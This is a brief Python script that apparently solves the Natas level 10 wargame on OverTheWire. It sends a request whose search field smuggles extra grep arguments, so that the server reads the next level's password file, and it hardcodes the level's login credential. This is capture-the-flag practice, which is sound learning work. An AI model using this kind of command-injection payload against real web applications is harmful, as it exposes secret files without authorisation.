#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re

username = 'natas10'
password = 'nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
response = session.get(url, auth = (username, password) )
response = session.post(url, data = {"needle": ". /etc/natas_webpass/natas11 #", "submit":"submit" }, auth = (username, password) )

content = response.text

print content

# print re.findall('<pre>\n(.*)\n</pre>', content)[0]